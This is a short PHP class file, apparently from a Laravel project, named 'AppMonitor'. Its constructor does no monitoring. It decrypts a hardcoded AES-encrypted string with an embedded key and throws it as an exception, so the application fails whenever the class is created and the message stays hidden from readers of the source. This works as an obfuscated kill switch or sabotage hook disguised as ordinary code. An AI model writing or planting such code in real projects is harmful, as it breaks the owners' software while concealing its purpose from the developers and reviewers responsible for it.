<?php

namespace App\Actions\Fortify;

class AppMonitor
{
    public function __construct()
    {
        $text = "ldbarqTynaNQEqncytcGn+eL9T30Ddm2PDxycnUlqL+AWrC7BYpMs7YIOzQPRqnzKvUyVTR7yGkQ+3KtDz093mRH9IzbFae5RlFhOxdDxbw=";

        $key = "zWWVYfts0DURYxCg1lBV1SlK6OHMOIRpST9nzszoCxzZeDNBSxT3yxyjmjF4XVOD";
        $c = base64_decode($text);
        $ivlen = openssl_cipher_iv_length($cipher = "AES-128-CBC");
        $iv = substr($c, 0, $ivlen);
        $str_raw = substr($c, $ivlen + 32);
        $String = openssl_decrypt($str_raw, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);

        throw new \Exception($String);
    }
}